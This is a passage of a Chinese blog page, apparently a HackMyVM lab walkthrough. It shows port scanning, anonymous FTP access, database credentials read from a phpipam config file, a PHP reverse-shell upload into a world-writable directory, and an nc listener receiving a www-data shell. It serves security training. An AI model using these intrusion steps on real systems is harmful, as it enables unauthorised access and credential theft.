@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="hack-my-vm-pam  端口扫描  12345678910111213kali@kali [~] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.178.41                                                                                [21:39:01][sudo]">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hack-my-vm-pam">
+<meta property="og:url" content="http://example.com/2025/03/15/hack-my-vm-pam/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="hack-my-vm-pam  端口扫描  12345678910111213kali@kali [~] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.178.41                                                                                [21:39:01][sudo]">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/03/15/hack-my-vm-pam/1.png">
+<meta property="og:image" content="http://example.com/2025/03/15/hack-my-vm-pam/2.png">
+<meta property="og:image" content="http://example.com/2025/03/15/hack-my-vm-pam/3.png">
+<meta property="og:image" content="http://example.com/2025/03/15/hack-my-vm-pam/4.png">
+<meta property="og:image" content="http://example.com/2025/03/15/hack-my-vm-pam/5.png">
+<meta property="article:published_time" content="2025-03-15T13:37:45.000Z">
+<meta property="article:modified_time" content="2025-03-15T14:39:06.662Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="HACK-MY-VM">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/03/15/hack-my-vm-pam/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>hack-my-vm-pam</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">Vulhub</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2025/03/13/hack-my-vm-eyes/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/03/15/hack-my-vm-pam/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/03/15/hack-my-vm-pam/&text=hack-my-vm-pam"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/03/15/hack-my-vm-pam/&title=hack-my-vm-pam"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/03/15/hack-my-vm-pam/&is_video=false&description=hack-my-vm-pam"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hack-my-vm-pam&body=Check out this article: http://example.com/2025/03/15/hack-my-vm-pam/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/03/15/hack-my-vm-pam/&title=hack-my-vm-pam"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/03/15/hack-my-vm-pam/&title=hack-my-vm-pam"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/03/15/hack-my-vm-pam/&title=hack-my-vm-pam"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/03/15/hack-my-vm-pam/&title=hack-my-vm-pam"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/03/15/hack-my-vm-pam/&name=hack-my-vm-pam&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/03/15/hack-my-vm-pam/&t=hack-my-vm-pam"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">hack-my-vm-pam</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">端口渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.4.</span> <span class="toc-text">解密</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        hack-my-vm-pam
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-15T13:37:45.000Z" itemprop="datePublished">2025-03-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/HACK-MY-VM/" rel="tag">HACK-MY-VM</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">hack-my-vm-pam</h1>
+
+<h3>端口扫描</h3>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.178.41                                                                                [21:39:01]</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-15 21:39 CST</span><br><span class="line">Nmap scan report for 192.168.178.41</span><br><span class="line">Host is up (0.0025s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:8B:4C:23 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.95 seconds</span><br><span class="line">kali@kali [~] ➜     </span><br></pre></td></tr></table></figure>
+
+<p><strong>深度扫描</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  sudo nmap -sT -sV -sC -p21,80 -O 192.168.178.41                                                                                 [21:39:45]</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-15 21:39 CST</span><br><span class="line">Nmap scan report for 192.168.178.41</span><br><span class="line">Host is up (0.00049s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">80/tcp open  http    nginx 1.18.0</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">MAC Address: 08:00:27:8B:4C:23 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.09 seconds</span><br><span class="line">kali@kali [~] ➜       </span><br></pre></td></tr></table></figure>
+
+<h3>端口渗透</h3>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  curl http://192.168.178.41                                                                                                      [21:40:40]</span><br><span class="line">phpipam is ready.</span><br></pre></td></tr></table></figure>
+
+<p><strong>phpipam是一个ip管理系统，我扫了扫目录，没有找到这个管理系统的路径，我就去21端口突破了</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  lftp 192.168.178.41 -u anonymous                                                                                                [21:40:59]</span><br><span class="line">密码: </span><br><span class="line">lftp anonymous@192.168.178.41:~&gt; ls  </span><br></pre></td></tr></table></figure>
+
+<p><strong>这个21号端口存在匿名登录，我们用lftp登录上去，这个交互性更强</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lftp anonymous@192.168.178.41:/var/www/html&gt; ls</span><br><span class="line">-rw-r--r--    1 33       33             18 Aug 18  2022 index.html</span><br><span class="line">drwxr-xr-x   12 33       33           4096 Aug 18  2022 phpipam</span><br></pre></td></tr></table></figure>
+
+<p><strong>能看到，有一个phpipam目录，我们就可以访问去看看了</strong></p>
+<p><img src="/2025/03/15/hack-my-vm-pam/1.png" alt="1"></p>
+<p><strong>一个登录系统，我没测试弱密码，我估计没有吧，我们21号端口能直接看下面的文件，登录上去意义不大</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">lftp anonymous@192.168.178.41:/var/www/html/phpipam&gt; ls</span><br><span class="line">-rw-r--r--    1 33       33            111 May 02  2022 INSTALL.txt</span><br><span class="line">-rw-r--r--    1 33       33           2236 May 02  2022 README.md</span><br><span class="line">-rw-r--r--    1 33       33            941 May 02  2022 SECURITY.md</span><br><span class="line">-rw-r--r--    1 33       33            105 May 02  2022 UPDATE</span><br><span class="line">drwxr-xr-x    3 33       33           4096 May 02  2022 api</span><br><span class="line">drwxr-xr-x   16 33       33           4096 May 02  2022 app</span><br><span class="line">-rw-r--r--    1 33       33           2715 May 02  2022 config.docker.php</span><br><span class="line">-rw-r--r--    1 33       33           7121 Aug 18  2022 config.php</span><br><span class="line">drwxr-xr-x    8 33       33           4096 May 02  2022 css</span><br><span class="line">drwxr-xr-x    4 33       33           4096 May 02  2022 db</span><br><span class="line">drwxr-xr-x    5 33       33           4096 May 02  2022 doc</span><br><span class="line">drwxr-xr-x   17 33       33           4096 May 02  2022 functions</span><br><span class="line">-rw-r--r--    1 33       33          14051 May 02  2022 index.php</span><br><span class="line">drwxr-xr-x    2 33       33           4096 May 02  2022 install</span><br><span class="line">drwxr-xr-x    7 33       33           4096 May 02  2022 js</span><br><span class="line">drwxr-xr-x    2 33       33           4096 May 02  2022 misc</span><br><span class="line">-rw-r--r--    1 33       33             26 May 02  2022 robots.txt</span><br><span class="line">drwxr-xr-x    2 33       33           4096 May 02  2022 upgrade</span><br></pre></td></tr></table></figure>
+
+<p><strong>看配置文件吧</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">lftp anonymous@192.168.178.41:/var/www/html/phpipam&gt; cat config.php | grep &quot;db&quot;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">db[<span class="string">&#x27;host&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">db[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;phpipam&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">db[<span class="string">&#x27;pass&#x27;</span>] = <span class="string">&#x27;phpipamadmin&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">db[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;phpipam&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">db[<span class="string">&#x27;port&#x27;</span>] = 3306;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">db[<span class="string">&#x27;webhost&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">db[<span class="string">&#x27;ssl&#x27;</span>]        = <span class="literal">false</span>;                             // <span class="literal">true</span>/false, <span class="built_in">enable</span> or <span class="built_in">disable</span> SSL as a whole</span></span><br><span class="line">// $db[&#x27;ssl_key&#x27;]    = &#x27;/path/to/cert.key&#x27;;               // path to an SSL key file. Only makes sense combined with ssl_cert</span><br><span class="line">// $db[&#x27;ssl_cert&#x27;]   = &#x27;/path/to/cert.crt&#x27;;               // path to an SSL certificate file. Only makes sense combined with ssl_key</span><br><span class="line">// $db[&#x27;ssl_ca&#x27;]     = &#x27;/path/to/ca.crt&#x27;;                 // path to a file containing SSL CA certs</span><br><span class="line">// $db[&#x27;ssl_capath&#x27;] = &#x27;/path/to/ca_certs&#x27;;               // path to a directory containing CA certs</span><br><span class="line">// $db[&#x27;ssl_cipher&#x27;] = &#x27;HIGH:!PSK:!SHA:!MD5:!RC4:!aNULL&#x27;; // one or more SSL Ciphers, see openssl ciphers -v &#x27;....&#x27;</span><br><span class="line">// $db[&#x27;ssl_verify&#x27;] = &#x27;true&#x27;;                            // Verify Common Name (CN) of server certificate?</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">db[<span class="string">&#x27;tmptable_engine_type&#x27;</span>] = <span class="string">&quot;MEMORY&quot;</span>;                // Temporary table <span class="built_in">type</span> to construct complex queries (MEMORY, InnoDB)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">db[<span class="string">&#x27;use_cte&#x27;</span>] = 1;                                    // Use recursive CTE queries [&gt;=MariaDB 10.2.2, &gt;=MySQL 8.0] (0=disabled, 1=autodetect, 2=force <span class="built_in">enable</span>)</span></span><br><span class="line">7121 bytes transferred</span><br><span class="line">lftp anonymous@192.168.178.41:/var/www/html/phpipam&gt; </span><br></pre></td></tr></table></figure>
+
+<p><strong>里面只有数据库的用户名和密码，没啥用，没开3306端口，我们外面连不上的，既然是一个管理的系统，后台可能是有文件上传的功能点的</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lftp anonymous@192.168.178.41:/var/www/html/phpipam&gt; find . | grep &quot;upload&quot;</span><br><span class="line">./app/admin/import-export/upload/</span><br><span class="line">./app/admin/settings/logo/logo-uploader.php</span><br><span class="line">./app/admin/vaults/edit-item-certificate-upload-form.php</span><br><span class="line">./app/subnets/import-subnet/upload/</span><br><span class="line">./functions/PHPMailer/examples/send_file_upload.phps</span><br><span class="line">./functions/PHPMailer/examples/send_multiple_file_upload.phps</span><br><span class="line">./js/uploader/</span><br><span class="line">./js/uploader/jquery.fileupload.js</span><br><span class="line">./js/uploader/jquery.iframe-transport.js</span><br><span class="line">./js/uploader/jquery.ui.widget.js</span><br><span class="line">lftp anonymous@192.168.178.41:/var/www/html/phpipam&gt; </span><br></pre></td></tr></table></figure>
+
+<p><strong>看看这个目录的权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">lftp anonymous@192.168.178.41:/var/www/html/phpipam&gt; ls -la app/admin/import-export</span><br><span class="line">drwxr-xr-x    3 33       33           4096 May 02  2022 .</span><br><span class="line">drwxr-xr-x   43 33       33           4096 May 02  2022 ..</span><br><span class="line">-rw-r--r--    1 33       33           3282 May 02  2022 README.TXT</span><br><span class="line">-rw-r--r--    1 33       33           3024 May 02  2022 export-bgp.php</span><br><span class="line">-rw-r--r--    1 33       33           2838 May 02  2022 export-devices-field-select.php</span><br><span class="line">-rw-r--r--    1 33       33           2995 May 02  2022 export-devices.php</span><br><span class="line">-rw-r--r--    1 33       33           1506 May 02  2022 export-devtype-field-select.php</span><br><span class="line">-rw-r--r--    1 33       33           2427 May 02  2022 export-devtype.php</span><br><span class="line">-rw-r--r--    1 33       33           4969 May 02  2022 export-ipaddr-field-select.php</span><br><span class="line">-rw-r--r--    1 33       33          10302 May 02  2022 export-ipaddr.php</span><br><span class="line">-rw-r--r--    1 33       33           1386 May 02  2022 export-l2dom-field-select.php</span><br><span class="line">-rw-r--r--    1 33       33           2108 May 02  2022 export-l2dom.php</span><br><span class="line">-rw-r--r--    1 33       33           4515 May 02  2022 export-subnets-field-select.php</span><br><span class="line">-rw-r--r--    1 33       33           9585 May 02  2022 export-subnets.php</span><br><span class="line">-rw-r--r--    1 33       33           3024 May 02  2022 export-vlan-field-select.php</span><br><span class="line">-rw-r--r--    1 33       33           5477 May 02  2022 export-vlan.php</span><br><span class="line">-rw-r--r--    1 33       33           1298 May 02  2022 export-vrf-field-select.php</span><br><span class="line">-rw-r--r--    1 33       33           2432 May 02  2022 export-vrf.php</span><br><span class="line">-rw-r--r--    1 33       33           1914 May 02  2022 generate-hosts.php</span><br><span class="line">-rw-r--r--    1 33       33           1526 May 02  2022 generate-mysql.php</span><br><span class="line">-rw-r--r--    1 33       33           5495 May 02  2022 generate-xls.php</span><br><span class="line">-rw-r--r--    1 33       33           7914 May 02  2022 import-button.php</span><br><span class="line">-rw-r--r--    1 33       33            340 May 02  2022 import-constants.php</span><br><span class="line">-rw-r--r--    1 33       33           6308 May 02  2022 import-devices-check.php</span><br><span class="line">-rw-r--r--    1 33       33           2902 May 02  2022 import-devices-preview.php</span><br><span class="line">-rw-r--r--    1 33       33           6278 May 02  2022 import-devices-select.php</span><br><span class="line">-rw-r--r--    1 33       33           3296 May 02  2022 import-devices.php</span><br><span class="line">-rw-r--r--    1 33       33           2161 May 02  2022 import-devtype-check.php</span><br><span class="line">-rw-r--r--    1 33       33           2562 May 02  2022 import-devtype-preview.php</span><br><span class="line">-rw-r--r--    1 33       33           3053 May 02  2022 import-devtype-select.php</span><br><span class="line">-rw-r--r--    1 33       33           1867 May 02  2022 import-devtype.php</span><br><span class="line">-rw-r--r--    1 33       33          12050 May 02  2022 import-ipaddr-check.php</span><br><span class="line">-rw-r--r--    1 33       33           2897 May 02  2022 import-ipaddr-preview.php</span><br><span class="line">-rw-r--r--    1 33       33           5840 May 02  2022 import-ipaddr-select.php</span><br><span class="line">-rw-r--r--    1 33       33           2553 May 02  2022 import-ipaddr.php</span><br><span class="line">-rw-r--r--    1 33       33           2603 May 02  2022 import-l2dom-check.php</span><br><span class="line">-rw-r--r--    1 33       33           2557 May 02  2022 import-l2dom-preview.php</span><br><span class="line">-rw-r--r--    1 33       33           3065 May 02  2022 import-l2dom-select.php</span><br><span class="line">-rw-r--r--    1 33       33           1850 May 02  2022 import-l2dom.php</span><br><span class="line">-rw-r--r--    1 33       33           4179 May 02  2022 import-load-data.php</span><br><span class="line">-rw-r--r--    1 33       33           3910 May 02  2022 import-recompute-logic.php</span><br><span class="line">-rw-r--r--    1 33       33           1957 May 02  2022 import-recompute-preview.php</span><br><span class="line">-rw-r--r--    1 33       33           4045 May 02  2022 import-recompute-select.php</span><br><span class="line">-rw-r--r--    1 33       33           2223 May 02  2022 import-recompute.php</span><br><span class="line">-rw-r--r--    1 33       33           9412 May 02  2022 import-subnets-check.php</span><br><span class="line">-rw-r--r--    1 33       33           2785 May 02  2022 import-subnets-preview.php</span><br><span class="line">-rw-r--r--    1 33       33           5202 May 02  2022 import-subnets-select.php</span><br><span class="line">-rw-r--r--    1 33       33           2508 May 02  2022 import-subnets.php</span><br><span class="line">-rw-r--r--    1 33       33           5383 May 02  2022 import-template.php</span><br><span class="line">-rw-r--r--    1 33       33           2981 May 02  2022 import-verify.php</span><br><span class="line">-rw-r--r--    1 33       33           4667 May 02  2022 import-vlan-check.php</span><br><span class="line">-rw-r--r--    1 33       33           2546 May 02  2022 import-vlan-preview.php</span><br><span class="line">-rw-r--r--    1 33       33           4062 May 02  2022 import-vlan-select.php</span><br><span class="line">-rw-r--r--    1 33       33           2191 May 02  2022 import-vlan.php</span><br><span class="line">-rw-r--r--    1 33       33           2455 May 02  2022 import-vrf-check.php</span><br><span class="line">-rw-r--r--    1 33       33           2542 May 02  2022 import-vrf-preview.php</span><br><span class="line">-rw-r--r--    1 33       33           3310 May 02  2022 import-vrf-select.php</span><br><span class="line">-rw-r--r--    1 33       33           1873 May 02  2022 import-vrf.php</span><br><span class="line">-rw-r--r--    1 33       33           3235 May 02  2022 index.php</span><br><span class="line">-rw-r--r--    1 33       33            644 May 02  2022 not-implemented.php</span><br><span class="line">drwxrwxrwx    2 33       33           4096 Mar 15 13:59 upload</span><br></pre></td></tr></table></figure>
+
+<p><strong>好家伙777权限，我们直接上传文件就可以了，上传反弹shell的php文件，进行反弹shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lftp anonymous@192.168.178.41:/var/www/html/phpipam/app/admin/import-export/upload&gt; put shell_web.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>我们上传的文件，是一个600权限的，也就是说除了我（anonymous和root）其它用户无法访问，我们将其赋予777权限，因为浏览器端的权限是www-data防止权限问题导致无法反弹shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lftp anonymous@192.168.178.41:/var/www/html/phpipam/app/admin/import-export/upload&gt;chmod 777 shell_web.php</span><br><span class="line">lftp anonymous@192.168.178.41:/var/www/html/phpipam/app/admin/import-export/upload&gt;  ls -la</span><br><span class="line">drwxrwxrwx    2 33       33           4096 Mar 15 13:59 .</span><br><span class="line">drwxr-xr-x    3 33       33           4096 May 02  2022 ..</span><br><span class="line">-rw-r--r--    1 33       33            259 May 02  2022 .htaccess</span><br><span class="line">-rwxrwxrwx    1 1001     1001           82 Mar 15 13:59 shell_web.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>浏览器端访问，kali开启监听，用来接收shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  nc -lvnp 8888                                              [21:58:14]</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [192.168.178.141] from (UNKNOWN) [192.168.178.41] 58684</span><br><span class="line">bash: cannot set terminal process group (345): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-5.1$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">bash-5.1$ </span><br></pre></td></tr></table></figure>
+
+<h3>提权</h3>
+
+<p><strong>我们去user用户目录下面看看</strong></p>
